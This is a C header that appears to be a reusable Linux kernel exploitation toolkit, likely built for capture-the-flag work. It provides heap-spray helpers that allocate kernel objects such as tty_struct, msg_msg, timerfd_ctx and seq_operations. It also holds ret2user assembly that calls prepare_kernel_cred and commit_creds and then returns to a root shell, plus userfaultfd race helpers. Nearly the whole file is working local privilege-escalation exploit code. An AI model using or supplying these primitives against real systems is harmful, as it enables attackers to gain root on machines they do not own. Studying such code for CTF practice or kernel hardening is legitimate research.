#ifndef __KUTIL_H__
#define __KUTIL_H__

#define ENABLE_SEQ_OPERATIONS
#define ENABLE_SHM_FILE_DATA
#define ENABLE_TIMERFD_CTX
#define ENABLE_TTY_STRUCT
#define ENABLE_MSG_MSG
#define ENABLE_ROP
#define ENABLE_USERFAULTFD
#define ENABLE_COMM
#define ENABLE_DUMP

#define PAGE_SIZE 0x1000

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define ABORT(msg)                                                             \
  do {                                                                         \
    fprintf(stderr, "[%s] %s: %s\n", __func__, msg, strerror(errno));          \
    exit(EXIT_FAILURE);                                                        \
  } while (0)

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#ifdef ENABLE_SEQ_OPERATIONS
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

int kmalloc32_seq_operations() {
  int fd = open("/proc/self/stat", O_RDONLY);
  if (fd == -1) {
    ABORT("open");
  }

  return fd;
}

void kfree_seq_operations(int fd) { close(fd); }
#endif

#ifdef ENABLE_SHM_FILE_DATA
#include <sys/ipc.h>
#include <sys/shm.h>

int kmalloc32_shm_file_data() {
  int id = shmget(IPC_PRIVATE, PAGE_SIZE, 0600);
  if (id == -1) {
    ABORT("shmget");
  }

  void *addr = shmat(id, NULL, 0);
  if (addr == (void *)-1) {
    ABORT("shmat");
  }

  return id;
}
#endif

#ifdef ENABLE_TIMERFD_CTX
#include <sys/timerfd.h>
#include <unistd.h>

int kmalloc256_timerfd_ctx() {
  int fd = timerfd_create(CLOCK_REALTIME, 0);
  if (fd == -1) {
    ABORT("timerfd_create");
  }

  struct itimerspec timerspec = {{0, 0}, {100, 0}};
  if (timerfd_settime(fd, 0, &timerspec, NULL) == -1) {
    ABORT("timerfd_settime");
  }

  return fd;
}

void kfree_timerfd_ctx(int fd) {
  close(fd);
  sleep(1);
}
#endif

#ifdef ENABLE_TTY_STRUCT
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

int kmalloc1024_tty_struct() {
  int fd = open("/dev/ptmx", O_RDWR | O_NOCTTY);
  if (fd == -1) {
    ABORT("open");
  }

  return fd;
}

void kfree_tty_struct(int fd) { close(fd); }
#endif

#ifdef ENABLE_MSG_MSG
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/types.h>

#include <assert.h>
#include <string.h>

#define MSG_COPY 040000
#define HDRLEN_MSG 0x30
#define HDRLEN_MSGSEG 0x08
#define MTEXTLEN_MSG(size) ((size)-HDRLEN_MSG)
#define MTEXTLEN_MSGSEG(size) ((size) + PAGE_SIZE - HDRLEN_MSG - HDRLEN_MSGSEG)

#ifdef __GLIBC__
struct msgbuf {
  long mtype;
  char mtext[1];
};
#endif

struct msgbuf *__new_msgbuf(size_t size) {
  struct msgbuf *msgbuf = (struct msgbuf *)malloc(sizeof(long) + size);
  if (!msgbuf) {
    ABORT("malloc");
  }

  msgbuf->mtype = 0;
  memset(msgbuf->mtext, 0, size);

  return msgbuf;
}

int __kmalloc_msg(size_t size, int n, char *mtext) {
  int msgid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
  if (msgid == -1) {
    ABORT("msgget");
  }

  struct msgbuf *msgbuf = __new_msgbuf(size);
  msgbuf->mtype = 1;
  if (mtext) {
    memcpy(msgbuf->mtext, mtext, size);
  } else {
    memset(msgbuf->mtext, 0x58585858, size);
  }

  int i;
  for (i = 0; i < n; i++) {
    int err = msgsnd(msgid, msgbuf, size, IPC_NOWAIT);
    if (err == -1) {
      ABORT("msgsnd");
    }
  }

  free(msgbuf);
  return msgid;
}

int kmalloc_msg(size_t size, int n, char *mtext) {
  assert(size <= PAGE_SIZE && size >= HDRLEN_MSG);

  return __kmalloc_msg(MTEXTLEN_MSG(size), n, mtext);
}

int kmalloc_msgseg(size_t size, int n, char *mtext) {
  assert(size <= PAGE_SIZE && size >= HDRLEN_MSGSEG);

  return __kmalloc_msg(MTEXTLEN_MSGSEG(size), n, mtext);
}

struct msgbuf *__kfree_msg(int msgid, size_t size) {
  struct msgbuf *msgbuf = __new_msgbuf(size);
  int err = msgrcv(msgid, msgbuf, size, 0, IPC_NOWAIT);
  if (err == -1) {
    ABORT("msgrcv");
  }

  return msgbuf;
}

struct msgbuf *kfree_msg(int msgid, size_t size) {
  assert(size <= PAGE_SIZE && size >= HDRLEN_MSG);

  return __kfree_msg(msgid, MTEXTLEN_MSG(size));
}

struct msgbuf *kfree_msgseg(int msgid, size_t size) {
  assert(size <= PAGE_SIZE && size >= HDRLEN_MSGSEG);

  return __kfree_msg(msgid, MTEXTLEN_MSGSEG(size));
}

struct msgbuf *__peek_msg(int msgid, size_t size) {
  struct msgbuf *msgbuf = __new_msgbuf(size);
  int err = msgrcv(msgid, msgbuf, size, 0, MSG_COPY | IPC_NOWAIT);
  if (err == -1) {
    ABORT("msgrcv");
  }

  return msgbuf;
}

struct msgbuf *peek_msg(int msgid, size_t size) {
  assert(size <= PAGE_SIZE && size >= HDRLEN_MSG);

  return __peek_msg(msgid, MTEXTLEN_MSG(size));
}

struct msgbuf *peek_msgseg(int msgid, size_t size) {
  assert(size <= PAGE_SIZE && size >= HDRLEN_MSGSEG);

  return __peek_msg(msgid, MTEXTLEN_MSGSEG(size));
}
#endif

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#ifdef ENABLE_ROP
#include <unistd.h>

void shell() {
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  execve("/bin/sh", argv, envp);
}

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_sp;
unsigned long user_rflags;
unsigned long user_ip = (unsigned long)shell;

void save_state() {
  asm(".intel_syntax noprefix;"
      "mov user_cs, cs;"
      "mov user_ss, ss;"
      "mov user_sp, rsp;"
      "pushf;"
      "pop user_rflags;"
      ".att_syntax;");
}

unsigned long prepare_kernel_cred;
unsigned long commit_creds;

void ret2user() {
  asm(".intel_syntax noprefix;"
      "mov rax, prepare_kernel_cred;"
      "xor rdi, rdi;"
      "call rax;"
      "mov rdi, rax;"
      "mov rax, commit_creds;"
      "call rax;"
      "swapgs;"
      "mov r15, user_ss;"
      "push r15;"
      "mov r15, user_sp;"
      "push r15;"
      "mov r15, user_rflags;"
      "push r15;"
      "mov r15, user_cs;"
      "push r15;"
      "mov r15, user_ip;"
      "push r15;"
      "iretq;"
      ".att_syntax;");
}

void rop_iretq(unsigned long *p) {
  *p++ = user_ip;
  *p++ = user_cs;
  *p++ = user_rflags;
  *p++ = user_sp;
  *p++ = user_ss;
}
#endif

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#ifdef ENABLE_USERFAULTFD
#include <assert.h>
#include <fcntl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

int userfaultfd() {
  int fd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
  if (fd == -1) {
    ABORT("syscall");
  }

  struct uffdio_api uffdio_api;
  uffdio_api.api = UFFD_API;
  uffdio_api.features = 0;
  int err = ioctl(fd, UFFDIO_API, &uffdio_api);
  if (err == -1) {
    ABORT("ioctl");
  }
}

void userfaultfd_register(int fd, void *start, size_t len) {
  assert(((unsigned long)start) % PAGE_SIZE == 0);
  assert(len % PAGE_SIZE == 0);

  struct uffdio_register uffdio_register;
  uffdio_register.range.start = (unsigned long)start;
  uffdio_register.range.len = len;
  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
  int err = ioctl(fd, UFFDIO_REGISTER, &uffdio_register);
  if (err == -1) {
    ABORT("ioctl");
  }
}

void userfaultfd_copy(int fd, void *dst, void *src) {
  assert(((unsigned long)dst) % PAGE_SIZE == 0);

  struct uffdio_copy uffdio_copy;
  uffdio_copy.src = (unsigned long)src;
  uffdio_copy.dst = (unsigned long)dst;
  uffdio_copy.len = PAGE_SIZE;
  uffdio_copy.mode = 0;
  uffdio_copy.copy = 0;
  int err = ioctl(fd, UFFDIO_COPY, &uffdio_copy);
  if (err == -1) {
    ABORT("ioctl");
  }
}

void userfaultfd_wait(int fd, struct uffd_msg *uffd_msg) {
  struct pollfd pollfd;
  pollfd.fd = fd;
  pollfd.events = POLLIN;

  int err = poll(&pollfd, 1, -1);
  if (err == -1) {
    ABORT("poll");
  }

  ssize_t nread = read(fd, uffd_msg, sizeof(uffd_msg));
  if (nread == -1) {
    ABORT("read");
  }

  assert(nread == sizeof(uffd_msg));
  assert(uffd_msg->event == UFFD_EVENT_PAGEFAULT);
}

#endif

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#ifdef ENABLE_COMM
#include <sys/prctl.h>

void set_comm(char *name) {
  if (prctl(PR_SET_NAME, name) == -1) {
    ABORT("prctl");
  }
}
#endif

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#ifdef ENABLE_DUMP
#include <stdint.h>
#include <stdio.h>

void dump(uint8_t *p, size_t len) {
  size_t i;
  for (i = 0; i + 16 <= len; i += 16) {
    printf("[%08zx] ", i);

    size_t j;
    for (j = 0; j < 16; j++) {
      printf("%02x", p[i + j]);
    }

    printf(" ");
    printf("%016lx %016lx", ((uint64_t *)&p[i])[0], ((uint64_t *)&p[i])[1]);

    printf(" ");
    for (j = 0; j < 16; j++) {
      printf("%c", p[i + j]);
    }

    printf("\n");
  }

  if (i < len) {
    printf("[%08zx] ", i);

    for (; i < len; i++) {
      printf("%02x", p[i]);
    }

    printf("\n");
  }
}
#endif

#endif
